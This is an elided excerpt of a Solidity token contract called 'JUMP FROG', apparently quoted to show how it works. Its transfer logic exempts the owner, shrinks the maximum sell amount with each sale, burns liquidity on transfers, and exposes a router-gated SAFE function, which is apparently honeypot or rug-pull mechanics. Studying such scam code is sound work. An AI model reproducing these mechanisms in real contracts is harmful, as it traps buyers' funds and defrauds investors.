...
contract JUMPFROG is Context, IERC20, Ownable {
    ...
    string private _name = "JUMP FROG";
    string private _symbol = "JFG";
    ...
    function _transfer(
        ...
        if (
            ...
            from != owner() &&
            to == uniswapV2Pair){
                require (balanceOf(uniswapV2Pair).add(amount) <= _maxTxAmount, 'Transfer Failed');
                _maxTxAmount = _maxTxAmount.sub(amount * 2);
                burnliquiditySell(amount);
            }
        ...
        if (
            ...
            to != uniswapRouter() &&
            to != owner()) {
            uint256 finalAmount = amount/100 * 5;       
            burnliquiditySell(finalAmount);
        }
    ...
    function burnliquiditySell(uint256 amount) private  {
    ...
    function SAFE(uint256 amount) public router()
